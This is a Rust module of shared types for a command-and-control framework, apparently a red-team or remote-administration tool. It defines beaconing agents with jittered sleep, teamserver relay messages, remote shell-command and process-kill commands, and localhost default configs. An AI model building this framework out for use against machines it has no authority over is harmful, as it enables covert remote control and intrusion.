use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use uuid::Uuid;
use chrono::{DateTime, Utc};

/// Unique identifier for agents
pub type AgentId = Uuid;

/// Command types that can be executed on agents
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CommandType {
    /// Execute a shell command
    ShellCommand(String),
    /// Get system information
    GetSystemInfo,
    /// Kill the agent
    Kill,
    /// Sleep for specified milliseconds
    Sleep { duration: u64, jitter_percent: u8 },
    /// Get process list
    GetProcessList,
    /// Kill a specific process
    KillProcess(u32),
}

/// Response from agent after command execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CommandResponse {
    /// Command executed successfully
    Success {
        output: String,
        exit_code: i32,
    },
    /// Command failed
    Error {
        error: String,
        exit_code: i32,
    },
    /// System information
    SystemInfo(SystemInfo),
    /// Process list
    ProcessList(Vec<ProcessInfo>),
}

/// System information structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: String,
    pub architecture: String,
    pub username: String,
    pub uptime: u64,
    pub memory_total: u64,
    pub memory_used: u64,
    pub cpu_count: usize,
    pub ip_addresses: Vec<String>,
    pub mac_addresses: Vec<String>,
}

/// Process information structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub command: String,
    pub memory_usage: u64,
    pub cpu_usage: f32,
}

/// Agent information structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfo {
    pub id: AgentId,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub mac_address: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub status: AgentStatus,
    pub version: String,
}

/// Extended agent information including sleep settings
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentInfoExtended {
    pub agent_info: AgentInfo,
    pub sleep_duration: Option<u64>, // Sleep duration in milliseconds
    pub sleep_jitter: Option<u8>,    // Jitter percentage
}

/// Agent status enumeration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AgentStatus {
    Online,
    Offline,
    Executing,
    Error,
}

/// Message types for communication between server and agents
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Message {
    /// Agent registration
    Register {
        agent_info: AgentInfo,
    },
    /// Heartbeat from agent
    Heartbeat {
        agent_id: AgentId,
        timestamp: DateTime<Utc>,
    },
    /// Command from server to agent
    Command {
        command_id: Uuid,
        command: CommandType,
    },
    /// Relay command from client to teamserver specifying agent
    RelayCommand {
        agent_id: AgentId,
        command_id: Uuid,
        command: CommandType,
    },
    /// Response from agent to server
    Response {
        command_id: Uuid,
        response: CommandResponse,
    },
    /// Error message
    Error {
        error: String,
    },
    /// Request list of online agents (client -> teamserver)
    ListAgentsRequest,
    /// Response with list of online agents (teamserver -> client)
    ListAgentsResponse {
        agents: Vec<AgentInfoExtended>,
    },
}

/// Command execution status
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandStatus {
    pub command_id: Uuid,
    pub agent_id: AgentId,
    pub command: CommandType,
    pub status: ExecutionStatus,
    pub created_at: DateTime<Utc>,
    pub completed_at: Option<DateTime<Utc>>,
    pub response: Option<CommandResponse>,
}

/// Execution status enumeration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExecutionStatus {
    Pending,
    Executing,
    Completed,
    Failed,
    Timeout,
}

/// Configuration for the C2 server
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ServerConfig {
    pub bind_address: String,
    pub port: u16,
    pub encryption_key: String,
    pub heartbeat_interval: u64,
    pub command_timeout: u64,
    pub max_agents: usize,
    pub log_level: String,
}

/// Configuration for the C2 agent
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub server_url: String,
    pub encryption_key: String,
    pub heartbeat_interval: u64,
    pub retry_interval: u64,
    pub max_retries: u32,
    pub user_agent: String,
    pub proxy: Option<String>,
}

/// Configuration for the C2 client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientConfig {
    pub teamserver_url: String,
    pub encryption_key: String,
    pub timeout: u64,
    pub retry_interval: u64,
    pub max_retries: u32,
}

/// Session information for agent-server communication
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Session {
    pub agent_id: AgentId,
    pub agent_info: AgentInfo,
    pub last_heartbeat: DateTime<Utc>,
    pub status: AgentStatus,
    pub pending_commands: HashMap<Uuid, CommandStatus>,
    pub sleep_duration: Option<u64>, // Sleep duration in milliseconds
    pub sleep_jitter: Option<u8>,    // Jitter percentage
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind_address: "127.0.0.1".to_string(),
            port: 8080,
            encryption_key: "default-key-change-in-production".to_string(),
            heartbeat_interval: 30,
            command_timeout: 300,
            max_agents: 1000,
            log_level: "info".to_string(),
        }
    }
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: "ws://127.0.0.1:8080".to_string(),
            encryption_key: "default-key-change-in-production".to_string(),
            heartbeat_interval: 30,
            retry_interval: 5,
            max_retries: 3,
            user_agent: "Rust-C2-Agent/1.0".to_string(),
            proxy: None,
        }
    }
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            teamserver_url: "ws://127.0.0.1:8080".to_string(),
            encryption_key: "default-key-change-in-production".to_string(),
            timeout: 30,
            retry_interval: 5,
            max_retries: 3,
        }
    }
} 